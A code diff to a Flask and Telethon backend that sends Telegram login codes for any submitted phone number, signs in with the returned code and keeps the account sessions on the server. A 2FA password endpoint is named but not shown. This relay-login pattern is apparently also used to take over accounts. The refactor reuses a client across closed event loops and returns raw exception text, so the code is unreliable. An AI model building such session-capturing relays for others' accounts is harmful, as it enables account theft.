@@ -1,7 +1,7 @@
+import asyncio
 import json
 import psycopg2
 import os
-import asyncio
 from aiogram import Bot
 from telethon.sync import TelegramClient
 from flask import Flask
@@ -31,6 +31,14 @@ os.makedirs(SESSIONS_DIR, exist_ok=True)
 
 # phone -> {client, phone_code_hash}
 pending = {}
+
+def run_telethon(coro):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(coro)
+    loop.close()
+    return result
+
 
 def session_path(phone):
     return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
@@ -67,58 +75,55 @@ def session_path(phone):
         # ===== SEND CODE =====
 @app.route("/send_code", methods=["POST"])
 def send_code():
-    phone = request.json.get("phone")
+    data = request.json
+    phone = data.get("phone")
 
-    try:
+    async def _send():
         client = TelegramClient(session_path(phone), API_ID, API_HASH)
-        client.connect()
-
-        sent = client.send_code_request(phone)
+        await client.connect()
+        sent = await client.send_code_request(phone)
         pending[phone] = {
             "client": client,
             "hash": sent.phone_code_hash
         }
+        return True
 
-        return jsonify({"ok": True})
+    try:
+        run_telethon(_send())
+        return jsonify({"status": "code_sent"})
+    except Exception as e:
+        print("SEND CODE ERROR:", e)
+        return jsonify({"status": "error", "message": str(e)}), 500
 
-    except PhoneNumberInvalidError:
-        return jsonify({"ok": False, "error": "phone_invalid"})
 
 
                         # ===== VERIFY CODE =====
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    phone = request.json.get("phone")
-    code = request.json.get("code")
+    data = request.json
+    phone = data.get("phone")
+    code = data.get("code")
 
     if phone not in pending:
-        return jsonify({"ok": False})
+        return jsonify({"status": "no_code_requested"})
 
-    client = pending[phone]["client"]
-    phone_hash = pending[phone]["hash"]
+    async def _verify():
+        client = pending[phone]["client"]
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=pending[phone]["hash"]
+        )
+        me = await client.get_me()
+        await client.disconnect()
+        pending.pop(phone)
+        return me.id
 
     try:
-        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
-        me = client.get_me()
-
-        conn = get_db()
-        cur = conn.cursor()
-        cur.execute("""
-            INSERT INTO authorized_users (user_id, phone)
-            VALUES (%s, %s)
-            ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
-        """, (str(me.id), phone))
-        conn.commit()
-        conn.close()
-
-        client.disconnect()
-        pending.pop(phone)
-
-        return jsonify({"ok": True, "user_id": me.id})
-
-    except PhoneCodeInvalidError:
-        return jsonify({"ok": False, "error": "invalid_code"})
-
+        user_id = run_telethon(_verify())
+        return jsonify({"status": "success", "user_id": user_id})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
         # ===== VERIFY PASSWORD (2FA) =====
@@ -195,6 +200,7 @@ def auth():
 # =========================
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
